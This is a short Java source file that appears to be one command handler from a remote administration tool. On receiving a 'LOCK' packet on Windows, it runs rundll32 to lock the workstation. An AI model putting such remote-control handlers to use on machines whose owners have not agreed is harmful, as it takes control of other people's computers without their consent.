package com.redpois0n.packets;

public class PacketLOCK extends Packet {

	@Override
	public void read(String line) throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("rundll32.exe user32.dll, LockWorkStation");
		}
	}

}
